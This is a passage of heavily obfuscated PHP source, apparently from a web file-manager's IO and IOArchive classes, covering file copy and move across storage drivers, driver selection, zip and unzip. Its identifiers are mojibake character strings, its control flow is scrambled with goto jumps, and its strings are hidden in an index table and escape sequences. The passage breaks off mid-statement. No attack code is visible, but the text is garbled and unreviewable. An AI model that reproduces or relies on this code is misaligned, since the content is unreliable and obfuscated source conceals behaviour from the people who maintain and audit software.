$bûΩ¡üÎ˘≥->getPathName($bûΩ¡üÎ˘≥->pathThis($BÑ≥ÖÁ—ô¨)); if ($dàº¯íµ±Ω) { $DèÍÁ£ëüû = $báãŒ‰˘ß«->fileNameExist($DıÒ ÆÇ„Ö, $bê≈≥ÚÑú»); $bê≈≥ÚÑú» = $báãŒ‰˘ß«->fileNameAuto($DıÒ ÆÇ„Ö, $bê≈≥ÚÑú», $dàº¯íµ±Ω, !$d∆áñÑËÑÜ); $dàº¯íµ±Ω = $DèÍÁ£ëüû ? $dàº¯íµ±Ω : !1; } goto C¶ÕŒıº∞ø; C≤”·–àπé: } private static function copyFile($FèùôìÜîï, $a™ÙúúÀ„Ã, $DËÈòôÏÍû, $C°Çﬁ¡Û∞á, $Aî◊Ö§èõÍ, $b∑æôó˘€ö) { goto bëè®—¬öÌ; b⁄’¨ΩÃ◊¥: Hook::trigger($A¡¯‡£Ééå[979], $FèùôìÜîï, $a™ÙúúÀ„Ã, $DËÈòôÏÍû, $C°Çﬁ¡Û∞á, $Aî◊Ö§èõÍ, $a≤‹≥îèáî); return $a≤‹≥îèáî; goto f‹êÒõµÒ‡; aáªíØÁƒÚ: mk_dir($B‚åù≈Ï¥ü); $Aó‹–¶∫ô¡ = $B‚åù≈Ï¥ü . $CÜß…ºöËã; $Aó‹–¶∫ô¡ = $FèùôìÜîï->download($a™ÙúúÀ„Ã, $Aó‹–¶∫ô¡); goto CÆ›¥ı„æá; CéÕ„∫≠É‡: Hook::trigger($A¡¯‡£Ééå[978], $FèùôìÜîï, $a™ÙúúÀ„Ã, $DËÈòôÏÍû, $C°Çﬁ¡Û∞á, $Aî◊Ö§èõÍ, $CÜß…ºöËã); if (self::driverIsSame($FèùôìÜîï, $DËÈòôÏÍû)) { if ($b∑æôó˘€ö) { $a≤‹≥îèáî = $DËÈòôÏÍû->moveFile($a™ÙúúÀ„Ã, $C°Çﬁ¡Û∞á); } else { $a≤‹≥îèáî = $DËÈòôÏÍû->copyFile($a™ÙúúÀ„Ã, $C°Çﬁ¡Û∞á); } Hook::trigger($A¡¯‡£Ééå[979], $FèùôìÜîï, $a™ÙúúÀ„Ã, $DËÈòôÏÍû, $C°Çﬁ¡Û∞á, $Aî◊Ö§èõÍ, $a≤‹≥îèáî); return $a≤‹≥îèáî; } $B‚åù≈Ï¥ü = TEMP_FILES; goto aáªíØÁƒÚ; CÆ›¥ı„æá: $Aó‹–¶∫ô¡ = $FèùôìÜîï->iconvApp($Aó‹–¶∫ô¡); $a≤‹≥îèáî = $DËÈòôÏÍû->upload($C°Çﬁ¡Û∞á, $Aó‹–¶∫ô¡, $b∑æôó˘€ö); self::remove($B‚åù≈Ï¥ü . $CÜß…ºöËã); goto b⁄’¨ΩÃ◊¥; bëè®—¬öÌ: $A¡¯‡£Ééå =& $_SERVER[£¿ÌÙëü¡¯¯]; $C°Çﬁ¡Û∞á = $DËÈòôÏÍû->getPath(rtrim($C°Çﬁ¡Û∞á, $A¡¯‡£Ééå[8]) . $A¡¯‡£Ééå[8] . $Aî◊Ö§èõÍ); $CÜß…ºöËã = $A¡¯‡£Ééå[977] . time() . rand_string(5); goto CéÕ„∫≠É‡; f‹êÒõµÒ‡: } public static function pathFather($f¶◊Üí≥ê¿) { $fÎ‚Ü’±¡å = IO::init($f¶◊Üí≥ê¿); $b”¨„‰™˜µ = $fÎ‚Ü’±¡å->pathFather($fÎ‚Ü’±¡å->path); return $fÎ‚Ü’±¡å->getPathOuter($b”¨„‰™˜µ); } public static function fileOut($C·ÂÇáå˘ƒ, $aâΩ‚áÀ˘¥ = false, $b⁄Ú’◊èé∏ = false, $B±ﬁ…ûﬂœµ = '') { $e¶˘◊ëå≠ü = self::driverMake($C·ÂÇáå˘ƒ); if ($e¶˘◊ëå≠ü->isFileOutServer()) { return $e¶˘◊ëå≠ü->fileOutServer($C·ÂÇáå˘ƒ, $aâΩ‚áÀ˘¥, $b⁄Ú’◊èé∏, $B±ﬁ…ûﬂœµ); } return $e¶˘◊ëå≠ü->fileOut($C·ÂÇáå˘ƒ, $aâΩ‚áÀ˘¥, $b⁄Ú’◊èé∏, $B±ﬁ…ûﬂœµ); } public static function fileOutImage($e€íˆòÙºÈ, $e¶Õ˘‡‘àº = 250) { $AêåÇìºèõ = array(250, 600, 1200, 3000); for ($cøüó¿´Ÿâ = 0; $cøüó¿´Ÿâ < count($AêåÇìºèõ); $cøüó¿´Ÿâ++) { if ($cøüó¿´Ÿâ == 0 && $e¶Õ˘‡‘àº <= $AêåÇìºèõ[$cøüó¿´Ÿâ]) { $e¶Õ˘‡‘àº = $AêåÇìºèõ[$cøüó¿´Ÿâ]; break; } else { if ($e¶Õ˘‡‘àº > $AêåÇìºèõ[$cøüó¿´Ÿâ - 1] && $e¶Õ˘‡‘àº <= $AêåÇìºèõ[$cøüó¿´Ÿâ]) { $e¶Õ˘‡‘àº = $AêåÇìºèõ[$cøüó¿´Ÿâ]; break; } else { if ($cøüó¿´Ÿâ == count($AêåÇìºèõ) - 1 && $e¶Õ˘‡‘àº > $AêåÇìºèõ[$cøüó¿´Ÿâ]) { $e¶Õ˘‡‘àº = $AêåÇìºèõ[$cøüó¿´Ÿâ]; break; } } } } $F≈€ôò´ãô = self::driverMake($e€íˆòÙºÈ); if ($F≈€ôò´ãô->isFileOutServer()) { return $F≈€ôò´ãô->fileOutImageServer($e€íˆòÙºÈ, $e¶Õ˘‡‘àº); } return $F≈€ôò´ãô->fileOutImage($e€íˆòÙºÈ, $e¶Õ˘‡‘àº); } private static function driverIsSame($b∫⁄Âˆ∏‡ü, $Fˆßºúé∏è) { goto D‡›íﬁ“Ë›; AÇﬂ¥˘óú÷: if ($b∫⁄Âˆ∏‡ü->pathDriver == $Fˆßºúé∏è->pathDriver) { return !0; } return !1; goto dßÔ—äèÆî; F∆∏ üˆß™: if ($AΩ¶•õ∑‰ß != $e‡äÜáøë√) { return !1; } if ($AΩ¶•õ∑‰ß == $Dæ≤£©û”ê[681]) { return !0; } if ($AΩ¶•õ∑‰ß == $Dæ≤£©û”ê[104]) { return !0; } goto AÇﬂ¥˘óú÷; D‡›íﬁ“Ë›: $Dæ≤£©û”ê =& $_SERVER[£¿ÌÙëü¡¯¯]; $AΩ¶•õ∑‰ß = $b∫⁄Âˆ∏‡ü->getType(); $e‡äÜáøë√ = $Fˆßºúé∏è->getType(); goto F∆∏ üˆß™; dßÔ—äèÆî: } public static function copyUpdate($C›úæëíÑî, $aôÑÇ∑∂éª) { goto b∂∑°ÎŒ¯Ò; B‘ÉÜ°Éãø: $CªÉø∑˜ﬁ« = self::_listAll($C›úæëíÑî); $cøú–ì„Ñ∫ = self::_listAll($aôÑÇ∑∂éª); $D∏ ≥†É»õ = array(); goto E¡ìÙËÉ∞Ñ; D∆ƒ¶—Ω∏€: Hook::trigger($b≥ê€ôäÖ©[983], $C›úæëíÑî, $aôÑÇ∑∂éª, $fı˘ñ≤◊Â ); foreach ($BÜŒõÑ’Ø as $B¨°»éÓ¥€) { IO::mkdir($B¨°»éÓ¥€); } foreach ($D∏ ≥†É»õ as $B¨°»éÓ¥€) { IO::copy($B¨°»éÓ¥€[$b≥ê€ôäÖ©[980]], $B¨°»éÓ¥€[$b≥ê€ôäÖ©[981]], REPEAT_REPLACE); } goto bï¯èî¡öÇ; E¡ìÙËÉ∞Ñ: $BÜŒõÑ’Ø = array(); foreach ($CªÉø∑˜ﬁ« as $eÇˆƒß÷Ò => $B¨°»éÓ¥€) { if ($B¨°»éÓ¥€[$b≥ê€ôäÖ©[77]] == 1 && !isset($cøú–ì„Ñ∫[$eÇˆƒß÷Ò])) { $BÜŒõÑ’Ø[] = $aôÑÇ∑∂éª . $b≥ê€ôäÖ©[8] . $eÇˆƒß÷Ò; } if ($B¨°»éÓ¥€[$b≥ê€ôäÖ©[77]] == 0) { if (!isset($cøú–ì„Ñ∫[$eÇˆƒß÷Ò]) || $cøú–ì„Ñ∫[$eÇˆƒß÷Ò][$b≥ê€ôäÖ©[78]] != $B¨°»éÓ¥€[$b≥ê€ôäÖ©[78]]) { $D∏ ≥†É»õ[] = array($b≥ê€ôäÖ©[980] => $B¨°»éÓ¥€[$b≥ê€ôäÖ©[76]], $b≥ê€ôäÖ©[981] => $aôÑÇ∑∂éª . $b≥ê€ôäÖ©[8] . get_path_father($eÇˆƒß÷Ò), $b≥ê€ôäÖ©[982] => $B¨°»éÓ¥€); if (isset($cøú–ì„Ñ∫[$eÇˆƒß÷Ò])) { IO::remove($aôÑÇ∑∂éª . $b≥ê€ôäÖ©[8] . $eÇˆƒß÷Ò); } } } } $fı˘ñ≤◊Â  = array($b≥ê€ôäÖ©[164] => $D∏ ≥†É»õ, $b≥ê€ôäÖ©[77] => $BÜŒõÑ’Ø); goto D∆ƒ¶—Ω∏€; b∂∑°ÎŒ¯Ò: $b≥ê€ôäÖ© =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!IO::exist($C›úæëíÑî)) { return !1; } if (!IO::exist($aôÑÇ∑∂éª)) { IO::mkdir($aôÑÇ∑∂éª); } goto B‘ÉÜ°Éãø; bï¯èî¡öÇ: } private static function _listAll($F™Ê©´ÓﬁÈ) { $EìΩŒêÑÑß =& $_SERVER[£¿ÌÙëü¡¯¯]; $F™Ê©´ÓﬁÈ = KodIO::clear($F™Ê©´ÓﬁÈ); $f–âÚÂÓÖÁ = IO::listAll($F™Ê©´ÓﬁÈ); foreach ($f–âÚÂÓÖÁ as &$CŸ¯∑€ûúı) { $AêãıÌœãæ = substr($CŸ¯∑€ûúı[$EìΩŒêÑÑß[76]], strlen($F™Ê©´ÓﬁÈ)); $CŸ¯∑€ûúı[$EìΩŒêÑÑß[984]] = trim($AêãıÌœãæ, $EìΩŒêÑÑß[8]); } return array_to_keyvalue($f–âÚÂÓÖÁ, $EìΩŒêÑÑß[984]); } public static function fileSubstr($Fÿ¨©Á®Ü±, $c¡¿‘íç§ú, $c†ñÉÈŸ§Œ = false) { goto BòŒâáèöà; bÈ„⁄Èåú‚: $aé¶÷¿≤ä‰ = $c†ñÉÈŸ§Œ; if ($c¡¿‘íç§ú < 0) { $c¡¿‘íç§ú = $bçÿËÖÎôÒ + $c¡¿‘íç§ú; } if ($c†ñÉÈŸ§Œ === !1) { $c†ñÉÈŸ§Œ = $bçÿËÖÎôÒ - $c¡¿‘íç§ú; } goto FŸ≥ø‡º€¿; FŸ≥ø‡º€¿: if ($c¡¿‘íç§ú + $c†ñÉÈŸ§Œ > $bçÿËÖÎôÒ) { $c†ñÉÈŸ§Œ = $bçÿËÖÎôÒ - $c¡¿‘íç§ú; } if ($c†ñÉÈŸ§Œ <= 0) { return $_SERVER[£¿ÌÙëü¡¯¯][33]; } if ($c¡¿‘íç§ú < 0 || $c¡¿‘íç§ú >= $bçÿËÖÎôÒ || $c†ñÉÈŸ§Œ > 1024 * 1024 * 5) { throw new Exception("\146\x69\x6c\145\122\x65\x61\x64\40\145\x72\x72\157\162\x21\x20\x73\x74\x61\162\164\75{$c¡¿‘íç§ú}\x3b\154\x65\x6e\147\x74\x68\75{$c†ñÉÈŸ§Œ}\x3b\x20\x73\151\172\145\75{$bçÿËÖÎôÒ}\x3b"); } goto D‡º≈ﬂÊ§û; BòŒâáèöà: $Eøãì‰ ‰ã = self::driverMake($Fÿ¨©Á®Ü±); $bçÿËÖÎôÒ = $Eøãì‰ ‰ã->size($Fÿ¨©Á®Ü±); $cóÚßåŒºÛ = $c¡¿‘íç§ú; goto bÈ„⁄Èåú‚; D‡º≈ﬂÊ§û: return $Eøãì‰ ‰ã->fileSubstr($Fÿ¨©Á®Ü±, $c¡¿‘íç§ú, $c†ñÉÈŸ§Œ); goto Cå◊„Û∑Ãû; Cå◊„Û∑Ãû: } private static function driverMake(&$aºåÓ¯ ≠Í) { goto fËÖÜˆÉÁë; C‹¶Í°¬é’: return $cÌª¯àºúÀ; goto CâÑúö„»–; fËÖÜˆÉÁë: $Fä√Êî∂À¥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aîı¬∞øˆ° = KodIO::parse($aºåÓ¯ ≠Í); if (!self::$driverListSystem) { $bŸ∫í≤«◊ = Model($Fä√Êî∂À¥[691])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($bŸ∫í≤«◊, $Fä√Êî∂À¥[364]); } goto F§ÒÃ√Á˜Ú; F§ÒÃ√Á˜Ú: if ($Aîı¬∞øˆ°[$Fä√Êî∂À¥[29]] == KodIO::KOD_IO && !self::$driverListSystem[$Aîı¬∞øˆ°[$Fä√Êî∂À¥[364]]]) { return !1; } $aºåÓ¯ ≠Í = $Aîı¬∞øˆ°[$Fä√Êî∂À¥[985]]; $cÌª¯àºúÀ = self::driverGet($Aîı¬∞øˆ°, $aºåÓ¯ ≠Í); goto C‹¶Í°¬é’; CâÑúö„»–: } private static function driverGet($aˆíá°ì¡—, &$BÉ±ô¢±ò“) { goto bÇé¥ä¥œã; Fòÿ≠Éäñ∞: if (isset($c‹÷‘µï¬¯[$A§µôæØ◊Ñ[6]][$A§µôæØ◊Ñ[997]])) { $Dü”ÿéîù->pathBase = rtrim($c‹÷‘µï¬¯[$A§µôæØ◊Ñ[6]][$A§µôæØ◊Ñ[997]], $A§µôæØ◊Ñ[8]) . $A§µôæØ◊Ñ[8]; $BÉ±ô¢±ò“ = $Dü”ÿéîù->pathBase . ltrim($BÉ±ô¢±ò“, $A§µôæØ◊Ñ[8]); } $BÉ±ô¢±ò“ = $Dü”ÿéîù->getPath($BÉ±ô¢±ò“); if (isset($aˆíá°ì¡—[$A§µôæØ◊Ñ[972]])) { $BÉ±ô¢±ò“ = $aˆíá°ì¡—[$A§µôæØ◊Ñ[972]]; } goto c‡¨ô¯¶°ã; bÇé¥ä¥œã: $A§µôæØ◊Ñ =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÏçôÉéçı = $aˆíá°ì¡—[$A§µôæØ◊Ñ[986]]; $F ∞Ü‹£Úê = $aˆíá°ì¡—[$A§µôæØ◊Ñ[364]]; goto d‘‹™–Æéï; bøßú’ì∫∞: $Dü”ÿéîù = self::$driverCache[$EÓ˘éﬂ„Ïó]; $Dü”ÿéîù->pathDriver = $DÏçôÉéçı; $Dü”ÿéîù->pathBase = $A§µôæØ◊Ñ[33]; goto Fòÿ≠Éäñ∞; d‘‹™–Æéï: switch ($aˆíá°ì¡—[$A§µôæØ◊Ñ[29]]) { case KodIO::KOD_IO: $c‹÷‘µï¬¯ = self::$driverListSystem[$F ∞Ü‹£Úê]; break; case KodIO::KOD_SOURCE: $BÉ±ô¢±ò“ = $F ∞Ü‹£Úê . $BÉ±ô¢±ò“; $c‹÷‘µï¬¯ = array($A§µôæØ◊Ñ[987] => $A§µôæØ◊Ñ[988], $A§µôæØ◊Ñ[6] => $aˆíá°ì¡—); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $e•±ﬂ“ÚÉØ = $GLOBALS[$A§µôæØ◊Ñ[989]]; self::$driverListUser = array_to_keyvalue($e•±ﬂ“ÚÉØ, $A§µôæØ◊Ñ[364]); } $c‹÷‘µï¬¯ = self::$driverListUser[$F ∞Ü‹£Úê]; break; case KodIO::KOD_SHARE_LINK: $c‹÷‘µï¬¯ = array($A§µôæØ◊Ñ[987] => $A§µôæØ◊Ñ[990], $A§µôæØ◊Ñ[6] => $aˆíá°ì¡—); $d›Ò¨“æπ = Action($A§µôæØ◊Ñ[991])->sharePathInfo($aˆíá°ì¡—[$A§µôæØ◊Ñ[76]]); $BÉ±ô¢±ò“ = $d›Ò¨“æπ[$A§µôæØ◊Ñ[366]]; if (!$d›Ò¨“æπ[$A§µôæØ◊Ñ[366]]) { $e¶ë∂ÑÑ´Õ = Model($A§µôæØ◊Ñ[528])->getInfo($d›Ò¨“æπ[$A§µôæØ◊Ñ[437]]); $BÉ±ô¢±ò“ = KodIO::clear($e¶ë∂ÑÑ´Õ[$A§µôæØ◊Ñ[992]] . $aˆíá°ì¡—[$A§µôæØ◊Ñ[985]]); $aˆíá°ì¡—[$A§µôæØ◊Ñ[435]] = $e¶ë∂ÑÑ´Õ; $aˆíá°ì¡—[$A§µôæØ◊Ñ[972]] = $BÉ±ô¢±ò“; $c‹÷‘µï¬¯ = array($A§µôæØ◊Ñ[987] => $A§µôæØ◊Ñ[993], $A§µôæØ◊Ñ[6] => $aˆíá°ì¡—); } break; case KodIO::KOD_SHARE_ITEM: $c‹÷‘µï¬¯ = array($A§µôæØ◊Ñ[987] => $A§µôæØ◊Ñ[994], $A§µôæØ◊Ñ[6] => $aˆíá°ì¡—); $e¶ë∂ÑÑ´Õ = Model($A§µôæØ◊Ñ[528])->getInfo($aˆíá°ì¡—[$A§µôæØ◊Ñ[364]]); if ($e¶ë∂ÑÑ´Õ[$A§µôæØ◊Ñ[366]] == $A§µôæØ◊Ñ[464]) { $BÉ±ô¢±ò“ = KodIO::clear($e¶ë∂ÑÑ´Õ[$A§µôæØ◊Ñ[992]] . $aˆíá°ì¡—[$A§µôæØ◊Ñ[985]]); $aˆíá°ì¡—[$A§µôæØ◊Ñ[435]] = $e¶ë∂ÑÑ´Õ; $aˆíá°ì¡—[$A§µôæØ◊Ñ[972]] = $BÉ±ô¢±ò“; $c‹÷‘µï¬¯ = array($A§µôæØ◊Ñ[987] => $A§µôæØ◊Ñ[995], $A§µôæØ◊Ñ[6] => $aˆíá°ì¡—); } break; default: $BÉ±ô¢±ò“ = $aˆíá°ì¡—[$A§µôæØ◊Ñ[76]]; $c‹÷‘µï¬¯ = array($A§µôæØ◊Ñ[987] => $A§µôæØ◊Ñ[996]); break; } $EÓ˘éﬂ„Ïó = $aˆíá°ì¡—[$A§µôæØ◊Ñ[76]]; if (!isset(self::$driverCache[$EÓ˘éﬂ„Ïó])) { $c„‹“¿¿¥µ = $A§µôæØ◊Ñ[72] . self::driverType($c‹÷‘µï¬¯[$A§µôæØ◊Ñ[91]]); if (!class_exists($c„‹“¿¿¥µ)) { show_json("{$c„‹“¿¿¥µ}\40\156\157\x74\40\x65\x78\151\x73\164\x73\x21", !1); } $FÀ£‰Â¿à— = isset($c‹÷‘µï¬¯[$A§µôæØ◊Ñ[6]]) ? $c‹÷‘µï¬¯[$A§µôæØ◊Ñ[6]] : !1; self::$driverCache[$EÓ˘éﬂ„Ïó] = new $c„‹“¿¿¥µ($FÀ£‰Â¿à—); } goto bøßú’ì∫∞; c‡¨ô¯¶°ã: $Dü”ÿéîù->path = $BÉ±ô¢±ò“; return $Dü”ÿéîù; goto d√‘ûÜõ˜ì; d√‘ûÜõ˜ì: } private static function driverType($AäÈÜ≤˜¶∂) { $a§çîÖ⁄ª” =& $_SERVER[£¿ÌÙëü¡¯¯]; $AäÈÜ≤˜¶∂ = strtolower($AäÈÜ≤˜¶∂); if ($AäÈÜ≤˜¶∂ == $a§çîÖ⁄ª”[65]) { $AäÈÜ≤˜¶∂ = $a§çîÖ⁄ª”[998]; } else { if (in_array($AäÈÜ≤˜¶∂, array($a§çîÖ⁄ª”[104], $a§çîÖ⁄ª”[58], $a§çîÖ⁄ª”[999]))) { $AäÈÜ≤˜¶∂ = ucfirst($AäÈÜ≤˜¶∂); } else { $AäÈÜ≤˜¶∂ = strtoupper($AäÈÜ≤˜¶∂); } } return $AäÈÜ≤˜¶∂; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $eò—õÖ∫¨Ω; if (!$eò—õÖ∫¨Ω) { $f˘„Ôè≤ˆå = IO::init($_SERVER[£¿ÌÙëü¡¯¯][8]); } return $f˘„Ôè≤ˆå; } private static function iconvSystem($Bî…ñïù≠Ë) { return self::local()->iconvSystem($Bî…ñïù≠Ë); } private static function iconvApp($cèíµùÎô∞) { return self::local()->iconvApp($cèíµùÎô∞); } public static function zip($eª»ØíÍ≈‰, $b‡ ÛÇ‘ãﬁ = "\172\151\160", $aæÀ«—¡û¿ = '', $CíÖ™ãÖÜ‰ = REPEAT_RENAME) { goto dﬁ∏‹§ÒÎå; A∞§›ÎÕÁÕ: if (count($AûÜ°‚ÿ≤õ) > 1) { $dô€‰”⁄ÉÈ = IO::info(IO::pathFather($Bú∆◊Ñ¯ƒ¢[$C¢≈∂ë¯Û•[76]])); $càâÍÛ∞ª = $dô€‰”⁄ÉÈ[$C¢≈∂ë¯Û•[28]]; } $CõÆÁôòë˘ = $aÛÍòÆﬁÃ◊; if (!$CõÆÁôòë˘) { $CõÆÁôòë˘ = get_path_father($Bú∆◊Ñ¯ƒ¢[$C¢≈∂ë¯Û•[76]]); $aÈŒäËÆ≈≤ = IO::info($CõÆÁôòë˘); if (!$aÈŒäËÆ≈≤[$C¢≈∂ë¯Û•[186]]) { show_json(LNG($C¢≈∂ë¯Û•[1001]), !1); } } goto B≤«›Éè§Ó; dﬁ∏‹§ÒÎå: $C¢≈∂ë¯Û• =& $_SERVER[£¿ÌÙëü¡¯¯]; $EòºËçÜã” = self::init($eª»ØíÍ≈‰[0][$C¢≈∂ë¯Û•[76]]); $Bú∆◊Ñ¯ƒ¢ = self::info($eª»ØíÍ≈‰[0][$C¢≈∂ë¯Û•[76]]); goto AÀ›öÜÁ† ; AÀ›öÜÁ† : $aÛÍòÆﬁÃ◊ = !1; if (!$aæÀ«—¡û¿ && $EòºËçÜã”->getType() == $C¢≈∂ë¯Û•[104]) { $AûÜ°‚ÿ≤õ = self::zipFileList($eª»ØíÍ≈‰); } else { $aÛÍòÆﬁÃ◊ = $aæÀ«—¡û¿ ? $aæÀ«—¡û¿ : TEMP_FILES . $C¢≈∂ë¯Û•[1000] . time() . rand_string(8) . $C¢≈∂ë¯Û•[8]; mk_dir($aÛÍòÆﬁÃ◊); $AûÜ°‚ÿ≤õ = self::zipFileList($eª»ØíÍ≈‰, $aÛÍòÆﬁÃ◊); } $càâÍÛ∞ª = $Bú∆◊Ñ¯ƒ¢[$C¢≈∂ë¯Û•[28]]; goto A∞§›ÎÕÁÕ; B≤«›Éè§Ó: $C‘üò∑∂Ìü = $CõÆÁôòë˘ . $càâÍÛ∞ª . $C¢≈∂ë¯Û•[94] . $b‡ ÛÇ‘ãﬁ; $C‘üò∑∂Ìü = get_filename_auto($C‘üò∑∂Ìü, $C¢≈∂ë¯Û•[33], $CíÖ™ãÖÜ‰); $eÓìâ‡úñÇ = self::iconvSystem($C‘üò∑∂Ìü); goto E§⁄“ÎÒ Œ; cÿ‚¥ª‚Æ∂: if ($aæÀ«—¡û¿ || !$aÛÍòÆﬁÃ◊) { if ($aÛÍòÆﬁÃ◊ && strstr($aÛÍòÆﬁÃ◊, TEMP_FILES)) { $a≈Ùî…åóì = $AûÜ°‚ÿ≤õ = array(); recursion_dir($CõÆÁôòë˘, $a≈Ùî…åóì, $AûÜ°‚ÿ≤õ, 0); foreach ($a≈Ùî…åóì as $E¥€ÎÓé∞¨) { del_dir($E¥€ÎÓé∞¨); } foreach ($AûÜ°‚ÿ≤õ as $Báñ…ºúß“) { if ($Báñ…ºúß“ == $eÓìâ‡úñÇ) { continue; } del_file($Báñ…ºúß“); } } return $C‘üò∑∂Ìü; } $b”îÊ‘∂Œé = self::pathFather($Bú∆◊Ñ¯ƒ¢[$C¢≈∂ë¯Û•[76]]); $fÓÀ€∞ÿÓã = self::move($C‘üò∑∂Ìü, $b”îÊ‘∂Œé, $CíÖ™ãÖÜ‰); goto b˜ëˆéÖªÂ; b˜ëˆéÖªÂ: if (!$fÓÀ€∞ÿÓã) { del_dir($aÛÍòÆﬁÃ◊); show_json(LNG($C¢≈∂ë¯Û•[1002]), !1); } del_dir($aÛÍòÆﬁÃ◊); return $fÓÀ€∞ÿÓã; goto Aô∂Éé¡ÜÆ; E§⁄“ÎÒ Œ: foreach ($AûÜ°‚ÿ≤õ as $F€Æ´»‘‹ó => $cÌãëìµ™Ã) { $AûÜ°‚ÿ≤õ[$F€Æ´»‘‹ó] = self::iconvSystem($cÌãëìµ™Ã); } KodArchive::create($eÓìâ‡úñÇ, $AûÜ°‚ÿ≤õ); if (!IO::exist($C‘üò∑∂Ìü)) { if ($aÛÍòÆﬁÃ◊) { del_dir($aÛÍòÆﬁÃ◊); } show_json(LNG($C¢≈∂ë¯Û•[1002]), !1); } goto cÿ‚¥ª‚Æ∂; Aô∂Éé¡ÜÆ: } public static function unzip($C…Ã‰ã“ÓÓ, $e∑Ûƒ⁄©»£ = "\x72\145\x70\x6c\141\143\x65") { goto e®”â–ç‹ß; féº“Ã…√Æ: $EëæÓó‰‹∆ = self::tmpFileName($B‚ÑäÊõñ⁄); $f£ÖäŒµëﬁ = TEMP_FILES . $EëæÓó‰‹∆; del_dir($f£ÖäŒµëﬁ); goto aá⁄¬ó‡”˜; e®”â–ç‹ß: $aÂ¶¢∆ÿÛª =& $_SERVER[£¿ÌÙëü¡¯¯]; $D—Üä¥Ì£ƒ = $C…Ã‰ã“ÓÓ[$aÂ¶¢∆ÿÛª[76]]; $bè„øÜ©‘â = $C…Ã‰ã“ÓÓ[$aÂ¶¢∆ÿÛª[1003]]; goto BÑÆ∏÷åÑ⁄; aõ‡ªÃ—Âß: $a‰›≤’‡π∞ = KodArchive::extract($d´ı‚´≥¶é, $f£ÖäŒµëﬁ . $aÂ¶¢∆ÿÛª[8], $dú»ì¿•êﬂ); self::archiveExt(); if (!$a‰›≤’‡π∞[$aÂ¶¢∆ÿÛª[1007]]) { show_json($aÂ¶¢∆ÿÛª[1008] . $a‰›≤’‡π∞[$aÂ¶¢∆ÿÛª[1009]], !1); } goto eó∆à∂”ÿÈ; BìÜ≠◊Ê¬Ò: foreach ($AÆœ‰®˜≥ò as $Dõ‹âì∏∑Í) { $Dõ‹âì∏∑Í = self::iconvApp($Dõ‹âì∏∑Í); self::move($Dõ‹âì∏∑Í, $bè„øÜ©‘â, $e∑Ûƒ⁄©»£); } del_dir($f£ÖäŒµëﬁ); if (!$Cûìè—∫Üù) { del_file($d´ı‚´≥¶é); } goto E˜ç—∑Ôâè; aá⁄¬ó‡”˜: mk_dir($f£ÖäŒµëﬁ); $DŒ”Ï≈¨ƒÉ = self::fileExt($B‚ÑäÊõñ⁄); $d´ı‚´≥¶é = $f£ÖäŒµëﬁ . $aÂ¶¢∆ÿÛª[94] . $DŒ”Ï≈¨ƒÉ; goto A °ù¢ Ê¬; E˜ç—∑Ôâè: return !0; goto c›∑‚Úäî„; A °ù¢ Ê¬: if (!@file_exists(self::iconvSystem($d´ı‚´≥¶é))) { $Cûìè—∫Üù = self::localFilePath($D—Üä¥Ì£ƒ, $DŒ”Ï≈¨ƒÉ); $d´ı‚´≥¶é = $Cûìè—∫Üù ? $Cûìè—∫Üù : parent::download($D—Üä¥Ì£ƒ, $d´ı‚´≥¶é); } $d´ı‚´≥¶é = self::iconvSystem($d´ı‚´≥¶é); $dú»ì¿•êﬂ = isset($C…Ã‰ã“ÓÓ[$aÂ¶¢∆ÿÛª[1005]]) ? $C…Ã‰ã“ÓÓ[$aÂ¶¢∆ÿÛª[1005]] : $aÂ¶¢∆ÿÛª[1006]; goto aõ‡ªÃ—Âß; eó∆à∂”ÿÈ: Hook::trigger($aÂ¶¢∆ÿÛª[1010], $f£ÖäŒµëﬁ); recursion_dir($f£ÖäŒµëﬁ, $Aí∫∑´≠√Ô, $f›Ç’ãüÖê, 0); $AÆœ‰®˜≥ò = array_merge($Aí∫∑´≠√Ô, $f›Ç’ãüÖê); goto BìÜ≠◊Ê¬Ò; BÑÆ∏÷åÑ⁄: if (!($B‚ÑäÊõñ⁄ = parent::info($D—Üä¥Ì£ƒ))) { show_json(LNG($aÂ¶¢∆ÿÛª[1004]), !1); } if (!($cî¥‚©Õÿ» = parent::infoFull($bè„øÜ©‘â))) { $bè„øÜ©‘â = parent::mkdir($bè„øÜ©‘â); $cî¥‚©Õÿ» = array($aÂ¶¢∆ÿÛª[76] => $bè„øÜ©‘â); } else { if (isset($cî¥‚©Õÿ»[$aÂ¶¢∆ÿÛª[366]]) && trim($cî¥‚©Õÿ»[$aÂ¶¢∆ÿÛª[76]], $aÂ¶¢∆ÿÛª[8]) != trim($bè„øÜ©‘â, $aÂ¶¢∆ÿÛª[8])) { $dßúƒıß§Ω = KodIO::make($cî¥‚©Õÿ»[$aÂ¶¢∆ÿÛª[457]]); $Cˆîû°¢Õª = parent::fileNameAuto($dßúƒıß§Ω, $cî¥‚©Õÿ»[$aÂ¶¢∆ÿÛª[28]], REPEAT_RENAME_FOLDER, !0); $bè„øÜ©‘â = parent::mkdir($dßúƒıß§Ω . $Cˆîû°¢Õª); $cî¥‚©Õÿ» = array($aÂ¶¢∆ÿÛª[76] => $bè„øÜ©‘â); } } $bè„øÜ©‘â = $cî¥‚©Õÿ»[$aÂ¶¢∆ÿÛª[76]]; goto féº“Ã…√Æ; c›∑‚Úäî„: } public static function unzipList($f√öÑÖ£öà) { goto b“‹Ê¨ı›™; f∂Ñ‡ÒµËÏ: $Dø≈õ¿±‚ß = self::info($f¯ˆŒ¡¢ΩÍ); $BŒ„ÂÉåÉº = self::fileExt($Dø≈õ¿±‚ß); $a⁄è¥ë‘√∑ = self::tmpFileName($Dø≈õ¿±‚ß); goto EêÙÜœ‹∆≤; DçúÜçﬁß€: $Eâ„Ô©º€À = json_encode($f±⁄áåÂ¢”[$b÷öûë¨º“[1009]]); self::setContent($FòÆ»≥Ò‚„, $Eâ„Ô©º€À); if (count($f±⁄áåÂ¢”[$b÷öûë¨º“[1009]]) >= $Fëô¡àÆ›ú) { show_json(sprintf(LNG($b÷öûë¨º“[1013]), count($f±⁄áåÂ¢”[$b÷öûë¨º“[1009]])), !1); } goto d⁄âÃë«°‚; EèÓ´ÆÓÙ’: if (!is_dir($fô¿ƒÖë—¨)) { mk_dir($fô¿ƒÖë—¨); } $bÎîŸµ⁄ôù = $fô¿ƒÖë—¨ . 